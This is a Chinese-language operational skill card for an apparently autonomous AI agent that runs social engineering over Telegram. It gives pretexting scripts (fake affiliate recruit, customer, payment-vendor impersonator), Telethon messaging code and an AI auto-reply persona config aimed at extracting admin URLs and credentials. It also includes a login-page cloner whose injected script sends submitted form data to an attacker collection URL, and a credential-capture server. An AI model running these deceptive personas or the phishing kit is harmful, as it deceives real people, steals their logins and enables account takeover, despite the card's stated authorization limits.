---
name: 乐土·人情
category: social-engineering
priority: P2
score: 6
metadata:
  tags:
    - social-engineering
    - telegram
    - customer-service
    - agent-recruit
    - phishing
    - trust-building
    - osint
    - pretexting
    - autonomous
    - tg-social
    - credential-harvest
    - initial-access
  version: "2.0"
  updated: "2026-09-04"
  author: 大爱仙尊
description: >-
  技术面穷尽后的社工/代理推进完整卡。TG 客服/招商社工话术模板、
  代理注册推进流程、客服钓鱼链构造、信息收集到初始访问的完整链。
  Telegram 社工自动盯回复、固定人设、AI 自动回复、状态文件断点续跑。
  触发：继续推进这两条线、自动盯回复、别等我下命令、代理招商社工、
  客服建立信任、autonomous-social-engagement、tg-social-engage。
  无入场券不许空转社工；号库入库/清库仍走 tg-account-library。
globs:
  - "*.session"
  - "*.json"
---

> **乐土**
> 沉沦黄土十万年，今再扬尘拂行衣。
> 只愿苍生共平等，万千生灵竞相揖。
> 轮回不忘初时志，万千生灵系心间！

# 自主社工 / 代理推进

**前提**：技术面 1–6 已穷尽，且至少有一类入场券（session / 客服 TG / 既有对话 / 前端泄露对接人）。

旧名 `tg-social-engage` 已并入本卡。

---

## 关联 Skill & Playbook

| 方向 | 名称 | 说明 |
|------|------|------|
| 上游 | `case-triage` | 案卷定级（确认技术面已穷尽） |
| 上游 | `strike-probe` | S1-S8 黑盒突击（先打完技术面） |
| 上游 | `auth-brute` | 登录爆破已穷尽 |
| 平行 | `tg-bot-webhook-hijack` | TG Bot Token 接管（非社工路径） |
| 平行 | `tg-cloud-panel` | TG 云控面板渗透 |
| 平行 | `tg-number-admin-pentest` | TG 号码管理后台 |
| 平行 | `browser-automation` | 自动化浏览器操作 |
| 下游 | `account-takeover-chain` | 社工获取凭据后 ATO |
| 下游 | `credential-harvest` | 凭据收割 |
| 下游 | `session-pipeline` | 会员 session 导入 |
| 工具 | `炼蛊房/social_engineer_agent.py` | 社工代理自动化 |
| 工具 | `炼蛊房/tg_social_monitor.py` | TG 消息监控/自动回复 |
| Playbook | `传承/飞鸽·号册.md` | TG 投递真源 |
| Playbook | `传承/乐土·人情.md` | 代理社工杀伤链 |
| 参考 | `智道藏书/旁支传承/skills/autonomous-social-engagement/SKILL.md` | 扩展包原版 |
| 参考 | `智道藏书/智道推演/techniques/social-engineering.md` | 假设包社工技术 |

---

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| **L1** | 成功建立联系（客服/招商回复且进入对话） | 只发了消息没收到回复 |
| **L1b** | 收集到目标内部信息（后台 URL / 登录方式 / 技术栈线索） | 只拿到公开信息 |
| **L2** | 获取到有效凭据（账号密码 / 后台地址 + 登录方式 / 邀请链接）| 凭据无效或已过期 |
| **L2b** | 以代理身份成功注册并进入代理后台 | 注册未通过审核 |
| **L3** | 通过社工获取的凭据/访问接管目标系统 | 只进入无权限的空面板 |

---

## 强制行为

1. **技术面必须先穷尽**：至少跑完 `strike_probe` S1–S8 + 专卡后才转社工
2. **必须有入场券**：session / 客服 TG / 对话记录 / 前端泄露对接人
3. 未进 scope 不社工
4. 用户说「停」立刻停
5. **号库路径**：`案卷/_tg_accounts/`（不要 `/opt/data`）
6. 不发真实恶意链接给非授权目标
7. 社工进度必须记录到 `STATUS.md`
8. **人设一致性**：同一条线保持同一人设，不在中途切换身份

---

## Phase 0: 信息收集与入场券确认

### 命令 0-1: 目标社工面情报收集

```python
#!/usr/bin/env python3
"""目标社工面情报收集（从案卷和公开信息中提取社工入口）"""
import os, re, json, sys

CASE_DIR = sys.argv[1] if len(sys.argv) > 1 else "案卷/<案卷>"

print("=== 社工入口扫描 ===")

# 从已有案卷中提取 TG 线索
tg_patterns = [
    (r't\.me/(\w+)', 'TG 用户/频道'),
    (r'@(\w{5,})', 'TG @username'),
    (r'tg://resolve\?domain=(\w+)', 'TG deeplink'),
    (r'telegram\.me/(\w+)', 'TG 链接'),
]

# 从 STATUS / REPORT 中搜索
for root, dirs, files in os.walk(CASE_DIR):
    for f in files:
        if not f.endswith(('.md', '.txt', '.json', '.html')):
            continue
        path = os.path.join(root, f)
        try:
            content = open(path, 'r', errors='replace').read()
        except:
            continue
        for pat, desc in tg_patterns:
            for m in re.finditer(pat, content):
                print(f"  {desc}: {m.group(0)} ← {os.path.basename(path)}")

# 常见社工入口
print("\n=== 常见社工入口检查清单 ===")
checklist = [
    "网站页脚/关于页 TG 客服链接",
    "网站在线客服（LiveChat / Zendesk / Tawk.to）",
    "邮箱（support@ / admin@ / contact@）",
    "WhatsApp / LINE / 微信客服",
    "代理注册页面（/agent / /register?type=agent）",
    "招商页面（/partner / /affiliate）",
    "前端 JS 中的 TG Bot Token / Webhook URL",
    "Android APP 内嵌客服链接",
    "社交媒体主页（Facebook / Twitter / Instagram）",
]
for item in checklist:
    print(f"  □ {item}")
```

### 命令 0-2: TG 账号库状态检查

```bash
# 检查可用 TG 号
python3 炼蛊房/tg_social_monitor.py list-accounts

# 检查号库
ls -la 案卷/_tg_accounts/*.session 2>/dev/null | wc -l
echo "可用 session 数量"
```

### 命令 0-3: 目标 TG 信息采集

```python
#!/usr/bin/env python3
"""TG 目标信息采集（用户名/群/频道 OSINT）"""
import requests, sys, json

TARGET_USERNAME = sys.argv[1] if len(sys.argv) > 1 else "target_user"

# 通过 t.me 公开页面采集
url = f"https://t.me/{TARGET_USERNAME}"
r = requests.get(url, timeout=10)
if r.status_code == 200:
    import re
    # 提取公开信息
    name = re.search(r'<meta property="og:title" content="([^"]+)"', r.text)
    desc = re.search(r'<meta property="og:description" content="([^"]+)"', r.text)
    img = re.search(r'<meta property="og:image" content="([^"]+)"', r.text)
    members = re.search(r'(\d[\d\s]*) (members|subscribers)', r.text)

    print(f"Username: @{TARGET_USERNAME}")
    if name: print(f"Name: {name.group(1)}")
    if desc: print(f"Description: {desc.group(1)[:200]}")
    if img: print(f"Avatar: {img.group(1)}")
    if members: print(f"Members: {members.group(1)}")

    # 判断类型
    if 'tgme_page_action' in r.text:
        if 'Send Message' in r.text:
            print("Type: User/Bot (可私聊)")
        elif 'View in Telegram' in r.text:
            print("Type: Group/Channel")
        elif 'Join' in r.text:
            print("Type: Public Group (可加入)")
else:
    print(f"HTTP {r.status_code} — 用户名不存在或已设隐私")
```

---

## Phase 1: 人设构建

### 话术模板库

#### 模板 1: 代理招商咨询（博彩/电商场景）

```text
--- 人设 ---
身份: 有经验的推广者，手上有流量资源
昵称: 建议用「阿X」「X哥」等本地化昵称
头像: 正常生活照（非明星/网红/默认头像）
个性签名: 简短业务相关（如 "流量合作"）

--- 开场白（首次联系）---
你好，我是做线上推广的，朋友介绍说你们这边在招代理？
想了解一下合作方式和分成比例。

--- 跟进（已读未回 24h 后）---
不好意思打扰了，我手上有不少 [TG群/FB页/抖音] 的流量，
之前在 [竞品名] 做过推广，月均能带 [X] 个有效用户。
方便的话加个微信详聊？或者这边直接说也行。

--- 深入（对方有兴趣）---
好的，那我先注册个代理账号测试一下后台吧。
注册链接发我一下？我先熟悉后台功能，有问题再问你。

--- 获取信息 ---
后台是在哪登录的？我看看网址对不对，别登错了。
结算周期是怎么算的？T+几？
有没有代理后台的使用教程？新手上手可能需要看一下。
```

#### 模板 2: 客服技术咨询（通用场景）

```text
--- 人设 ---
身份: 普通用户 / 潜在客户，遇到技术问题
态度: 礼貌但略焦急

--- 开场白 ---
你好，我在使用你们的 [产品/服务] 时遇到了问题。
[具体问题描述 — 登录失败/充值没到账/功能异常]
能帮我看一下吗？

--- 信息提取 ---
这个问题是不是你们服务器的问题？最近有升级吗？
你们的技术团队在用什么后台系统？我之前用过 [类似产品]，
想确认一下是不是同一个问题。
你们的 APP 是在哪下载的？我重新装一个试试。

--- 升级到技术 ---
我之前做过开发，这个问题看起来像是 [具体猜测]，
你们的技术能看一下日志吗？或者给我看一下报错截图？
```

#### 模板 3: 上游供应商/合作方伪装

```text
--- 人设 ---
身份: 上游支付/技术供应商的对接人
态度: 专业、直接

--- 开场白 ---
你好，我是 [支付公司] 的技术对接人，
我们这边系统升级需要确认一下你们的接口配置。
你是负责技术对接的吗？

--- 信息提取 ---
你们现在用的是哪个版本的 API？
回调地址是不是 [猜测的URL]？
对接人的联系方式发我一下，我直接跟技术沟通。
```

---

## Phase 2: TG 社工执行

### 命令 2-1: 社工代理自动运行

```bash
# 启动社工代理（自动发送/监控/回复）
python3 炼蛊房/social_engineer_agent.py run \
  -d <授权域> \
  --goal agent_url \
  --persona "代理招商咨询" \
  --max-rounds 10

# 指定目标 TG 用户
python3 炼蛊房/social_engineer_agent.py run \
  -d <授权域> \
  --target @customer_service_bot \
  --goal "获取代理注册链接和后台地址" \
  --persona "有流量的推广者"
```

### 命令 2-2: TG 消息监控与自动回复

```bash
# 监控目标 TG 对话（自动回复模式）
python3 炼蛊房/tg_social_monitor.py run \
  --phone <号码> \
  --target @<客服TG> \
  --auto-reply \
  --persona "代理咨询" \
  --log 案卷/<案卷>/社工/tg_log.jsonl

# 手动模式（只监控，不自动回复）
python3 炼蛊房/tg_social_monitor.py run \
  --phone <号码> \
  --target @<客服TG> \
  --watch-only \
  --log 案卷/<案卷>/社工/tg_watch.jsonl
```

### 命令 2-3: TG 消息发送（单条/批量）

```python
#!/usr/bin/env python3
"""TG 消息发送工具（社工推进用）"""
from telethon import TelegramClient
import asyncio, sys, json

SESSION = sys.argv[1]  # .session 文件路径
TARGET = sys.argv[2]   # @username 或 chat_id
MESSAGE = sys.argv[3] if len(sys.argv) > 3 else None

API_ID = 0       # 替换
API_HASH = ""    # 替换

async def main():
    client = TelegramClient(SESSION, API_ID, API_HASH)
    await client.start()

    # 获取目标实体
    entity = await client.get_entity(TARGET)
    print(f"Target: {entity.first_name or ''} {entity.last_name or ''} (@{entity.username or 'N/A'})")

    if MESSAGE:
        # 发送消息
        msg = await client.send_message(entity, MESSAGE)
        print(f"Sent: {msg.id}")
    else:
        # 读取最近消息
        print("\n=== 最近 10 条消息 ===")
        async for msg in client.iter_messages(entity, limit=10):
            sender = "ME" if msg.out else "THEM"
            print(f"[{msg.date}] {sender}: {msg.text[:200] if msg.text else '<media>'}")

    await client.disconnect()

asyncio.run(main())
```

---

## Phase 3: 代理注册与后台渗透

### 命令 3-1: 代理注册自动化

```python
#!/usr/bin/env python3
"""代理注册自动化（从社工获取的注册链接开始）"""
import requests, re, sys, json, time

REGISTER_URL = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/agent/register"
s = requests.Session()
s.verify = False

# Step 1: 获取注册页面
r = s.get(REGISTER_URL)
print(f"Register page: HTTP {r.status_code}")

# 提取表单字段
fields = re.findall(r'name=["\'](\w+)["\']', r.text)
print(f"Form fields: {fields}")

# 提取 CSRF / hidden fields
hidden = {}
for m in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\'](\w+)["\'][^>]+value=["\']([^"\']*)["\']', r.text):
    hidden[m.group(1)] = m.group(2)
print(f"Hidden fields: {hidden}")

# Step 2: 填写注册（根据实际字段调整）
data = {
    **hidden,
    "username": f"test_agent_{int(time.time()) % 10000}",
    "password": "TestAgent@123",
    "password_confirm": "TestAgent@123",
    "phone": "+8613800138000",
    "email": f"test_{int(time.time()) % 10000}@temp.com",
    "invite_code": "",  # 从社工获取
}

print(f"\nRegistering with: {json.dumps({k:v for k,v in data.items() if 'password' not in k.lower()}, indent=2)}")

# Step 3: 提交注册
r = s.post(REGISTER_URL, data=data, allow_redirects=False)
print(f"Register: HTTP {r.status_code}")
if r.status_code in (301, 302):
    print(f"Redirect: {r.headers.get('Location', 'N/A')}")

# Step 4: 检查是否可以登录
login_urls = ["/agent/login", "/admin/login", "/api/agent/login", "/login"]
for login_url in login_urls:
    base = REGISTER_URL.rsplit('/', 2)[0]
    r = s.get(f"{base}{login_url}")
    if r.status_code == 200 and ('login' in r.text.lower() or 'password' in r.text.lower()):
        print(f"Login page found: {base}{login_url}")
        break
```

### 命令 3-2: 客服对话信息提取

```python
#!/usr/bin/env python3
"""从社工对话日志中自动提取有价值信息"""
import json, re, sys

LOG_FILE = sys.argv[1] if len(sys.argv) > 1 else "案卷/<案卷>/社工/tg_log.jsonl"

intel = {
    "urls": set(),
    "emails": set(),
    "phones": set(),
    "usernames": set(),
    "tech_clues": [],
    "credentials": [],
    "key_messages": [],
}

patterns = {
    "urls": r'https?://[^\s<>"]+',
    "emails": r'[\w.+-]+@[\w-]+\.[\w.-]+',
    "phones": r'[\+]?\d{10,13}',
    "tg_users": r'@\w{5,}',
}

try:
    with open(LOG_FILE, 'r') as f:
        for line in f:
            try:
                msg = json.loads(line.strip())
            except:
                continue
            text = msg.get("text", "") or ""

            for name, pat in patterns.items():
                for m in re.finditer(pat, text):
                    intel.get(name, intel.get("urls")).add(m.group())

            # 技术线索
            tech_keywords = ['后台', 'admin', 'login', '密码', 'password', '数据库',
                           'api', 'token', '服务器', 'server', '版本', 'version',
                           '域名', 'domain', '端口', 'port']
            if any(kw in text.lower() for kw in tech_keywords):
                intel["tech_clues"].append(text[:200])

            # 凭据线索
            cred_patterns = [
                r'[用帐账]户?\s*[:：]\s*(\S+)',
                r'密码\s*[:：]\s*(\S+)',
                r'password\s*[:：]\s*(\S+)',
            ]
            for cp in cred_patterns:
                for cm in re.finditer(cp, text, re.I):
                    intel["credentials"].append(cm.group())

except FileNotFoundError:
    print(f"Log file not found: {LOG_FILE}")
    sys.exit(1)

print("=== 社工情报提取 ===")
for key, values in intel.items():
    if values:
        print(f"\n{key}:")
        items = list(values) if isinstance(values, set) else values
        for v in items[:20]:
            print(f"  • {v}")
```

---

## Phase 4: 钓鱼链构造

### 命令 4-1: 钓鱼页面生成（登录克隆）

```python
#!/usr/bin/env python3
"""快速克隆目标登录页为钓鱼页（仅授权目标）"""
import requests, re, sys, os
from urllib.parse import urljoin

TARGET_LOGIN = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/login"
OUTPUT_DIR = sys.argv[2] if len(sys.argv) > 2 else "/tmp/phish_page"
COLLECT_URL = sys.argv[3] if len(sys.argv) > 3 else "https://attacker.com/collect"

os.makedirs(OUTPUT_DIR, exist_ok=True)

s = requests.Session()
s.verify = False
r = s.get(TARGET_LOGIN)

html = r.text

# 替换 form action 为收集服务器
html = re.sub(
    r'(<form[^>]*action=)["\']([^"\']*)["\']',
    f'\\1"{COLLECT_URL}"',
    html
)

# 保持原始 CSS/JS 的绝对路径
for tag in ['href', 'src', 'action']:
    html = re.sub(
        rf'({tag}=")(/[^"]*")',
        lambda m: m.group(1) + urljoin(TARGET_LOGIN, m.group(2).rstrip('"')) + '"',
        html
    )

# 添加凭据收集 JS
collect_js = f"""
<script>
document.querySelectorAll('form').forEach(form => {{
  form.addEventListener('submit', function(e) {{
    e.preventDefault();
    const data = new FormData(form);
    const obj = {{}};
    data.forEach((v, k) => obj[k] = v);
    obj._ts = Date.now();
    obj._ref = document.referrer;
    fetch('{COLLECT_URL}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(obj)
    }}).then(() => {{
      window.location.href = '{TARGET_LOGIN}';
    }});
  }});
}});
</script>
"""
html = html.replace('</body>', collect_js + '</body>')

with open(os.path.join(OUTPUT_DIR, 'index.html'), 'w') as f:
    f.write(html)

print(f"Phishing page saved to {OUTPUT_DIR}/index.html")
print(f"Collect URL: {COLLECT_URL}")
print(f"Original: {TARGET_LOGIN}")
```

### 命令 4-2: 凭据收集服务器

```python
#!/usr/bin/env python3
"""轻量凭据收集服务器（社工钓鱼配套）"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime, sys, os

LOG_FILE = sys.argv[1] if len(sys.argv) > 1 else "phish_creds.jsonl"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8443

class CollectHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', 'replace')

        entry = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "path": self.path,
            "ip": self.client_address[0],
            "ua": self.headers.get('User-Agent', ''),
            "referer": self.headers.get('Referer', ''),
            "body": body[:2000],
        }

        try:
            entry["parsed"] = json.loads(body)
        except:
            pass

        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry, ensure_ascii=False) + '\n')

        print(f"[{entry['timestamp']}] Credential captured from {entry['ip']}")
        if 'parsed' in entry:
            for k, v in entry['parsed'].items():
                if any(kw in k.lower() for kw in ['user','pass','email','phone','token']):
                    print(f"  ⚠️  {k}: {v}")

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def log_message(self, format, *args):
        pass

print(f"Collect server on :{PORT}, logging to {LOG_FILE}")
HTTPServer(('0.0.0.0', PORT), CollectHandler).serve_forever()
```

---

## Phase 5: 完整社工链（信息收集 → 初始访问）

### 流程图

```
┌─────────────────┐
│  Phase 0: OSINT │ ← 从案卷/公开信息提取社工入口
│  TG/邮箱/客服   │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 1: 人设  │ ← 选择话术模板，准备 TG 号
│  构建与准备     │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 2: 初始  │ ← 首次联系，建立信任
│  接触           │
└────────┬────────┘
         │ 回复？
    ┌────┴────┐
    │ Yes     │ No → 换号/换入口/升级话术
    │         │
┌───▼───┐    │
│Phase 3│    │
│信息提 │    │
│取     │    │
└───┬───┘    │
    │         │
┌───▼────────▼──┐
│  Phase 4: 目标│ ← 获取后台URL/凭据/注册链接
│  达成/钓鱼    │
└───────┬───────┘
        │
┌───────▼───────┐
│  Phase 5: 接管│ ← 使用凭据登录/注册代理
│  验证         │    交接给 account-takeover-chain
└───────────────┘
```

### 命令 5-1: 完整链编排（断点续跑）

```bash
# 完整社工链编排（状态文件驱动，支持断点续跑）
CASE="<案卷名>"
DOMAIN="<授权域>"
TARGET_TG="@<客服username>"

# Step 1: 情报收集
python3 炼蛊房/social_engineer_agent.py recon \
  -d "$DOMAIN" \
  --case "$CASE" \
  --out "案卷/${CASE}/社工/recon.json"

# Step 2: 启动社工（自动模式）
python3 炼蛊房/social_engineer_agent.py run \
  -d "$DOMAIN" \
  --target "$TARGET_TG" \
  --goal "agent_url" \
  --persona "代理招商" \
  --state "案卷/${CASE}/社工/state.json" \
  --max-rounds 20 \
  --auto-reply

# Step 3: 如果中断，断点续跑
python3 炼蛊房/social_engineer_agent.py resume \
  --state "案卷/${CASE}/社工/state.json"

# Step 4: 提取情报
python3 -c "
import json
state = json.load(open('案卷/${CASE}/社工/state.json'))
print('Status:', state.get('status'))
print('Rounds:', state.get('round_count'))
print('Intel:', json.dumps(state.get('intel', {}), indent=2, ensure_ascii=False))
"
```

---

## Phase 6: AI 自动回复引擎

### 命令 6-1: 配置 AI 自动回复

```python
#!/usr/bin/env python3
"""TG 社工 AI 自动回复配置（基于人设模板）"""
import json, sys

CONFIG = {
    "persona": {
        "name": "阿明",
        "role": "推广者/代理",
        "background": "做过3年线上推广，手上有TG群和FB页面流量",
        "tone": "礼貌、专业、略急切",
        "forbidden_topics": ["政治", "违法", "色情"],
    },
    "goals": [
        {"priority": 1, "goal": "获取代理注册链接", "keywords": ["注册", "register", "链接", "link"]},
        {"priority": 2, "goal": "获取后台登录地址", "keywords": ["后台", "admin", "登录", "login"]},
        {"priority": 3, "goal": "获取技术对接人联系方式", "keywords": ["技术", "对接", "开发"]},
        {"priority": 4, "goal": "了解结算方式和周期", "keywords": ["结算", "分成", "佣金"]},
    ],
    "auto_responses": {
        "greeting": "你好，我是做线上推广的，朋友介绍来了解合作的",
        "ask_register": "好的，注册链接发我一下？我先测试一下后台",
        "ask_backend": "后台是在哪登录的？我看看网址",
        "ask_tech": "你们用的什么系统？我之前对接过类似的",
        "stall": "好的，我研究一下，有问题再问你",
        "thanks": "收到，谢谢！我先去注册看看",
    },
    "escalation": {
        "no_reply_hours": 24,
        "no_reply_action": "send_followup",
        "followup_message": "不好意思又打扰了，上次说的合作方案考虑得怎么样了？",
        "max_followups": 3,
    }
}

output = sys.argv[1] if len(sys.argv) > 1 else "social_config.json"
with open(output, 'w') as f:
    json.dump(CONFIG, f, indent=2, ensure_ascii=False)
print(f"Config saved to {output}")
print("Usage: python3 炼蛊房/tg_social_monitor.py run --config {output} ...")
```

---

## 已知局限

1. TG 新号发消息可能被对方设置为「非联系人不可私聊」
2. 部分客服使用 Bot 自动回复，难以绕过预设话术
3. 代理注册可能需要实名认证（身份证/银行卡），不可伪造
4. 社工周期通常需要 1-7 天，非即时产出
5. 频繁换号可能导致 TG 号被风控
6. AI 自动回复在复杂对话中可能露馅

---

## 安全红线

1. **不对非授权目标社工**
2. **不发送真实恶意软件**（钓鱼页仅收集凭据，不下马）
3. **不冒充执法机关/政府**
4. **不威胁/勒索**
5. **社工获取的凭据仅用于授权范围内的验证**
6. **用户说停立刻停**

---

## 产出与落盘

```
案卷/<案卷>/
├── STATUS.md                        # 含社工进度
├── 社工/
│   ├── recon.json                   # 情报收集结果
│   ├── state.json                   # 社工代理状态（断点续跑）
│   ├── tg_log.jsonl                 # TG 对话记录
│   ├── tg_watch.jsonl               # TG 监控记录
│   ├── intel_extract.json           # 从对话中提取的情报
│   ├── social_config.json           # AI 自动回复配置
│   ├── phish_page/                  # 钓鱼页面（如使用）
│   └── creds_collected.jsonl        # 收集到的凭据
└── REPORT.md
```

---

## 真源

- 工具: `炼蛊房/social_engineer_agent.py` / `炼蛊房/tg_social_monitor.py`
- Playbook: `传承/飞鸽·号册.md`
- Playbook: `传承/乐土·人情.md`
- 扩展: `智道藏书/旁支传承/skills/autonomous-social-engagement/SKILL.md`
- 号库: `案卷/_tg_accounts/`
- 分级: `传承/春秋蝉·分案.md`
